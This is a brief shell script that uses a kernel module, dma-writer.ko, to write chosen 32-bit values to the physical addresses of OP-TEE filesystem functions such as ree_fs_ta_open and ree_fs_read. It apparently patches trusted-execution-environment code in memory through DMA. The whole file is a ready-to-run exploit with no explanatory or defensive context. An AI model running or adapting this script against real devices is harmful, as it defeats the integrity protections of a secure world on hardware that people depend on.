#!/bin/sh

# ree_fs_ta_open
# 10156914
insmod dma-writer.ko addr=269838612 data=3943170335
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# 10116880
insmod dma-writer.ko addr=269576320 data=3019899007
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# 1011688c
insmod dma-writer.ko addr=269576332 data=889202879
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# ree_fs_open
# 10116c64
insmod dma-writer.ko addr=269577316 data=3942645791
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# ree_fs_ta_read
# 10116530
insmod dma-writer.ko addr=269575472 data=889192031
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# ree_fs_read
# 1011655c
insmod dma-writer.ko addr=269575516 data=905967775
# echo Press enter to continue... ; read
rmmod dma-writer.ko
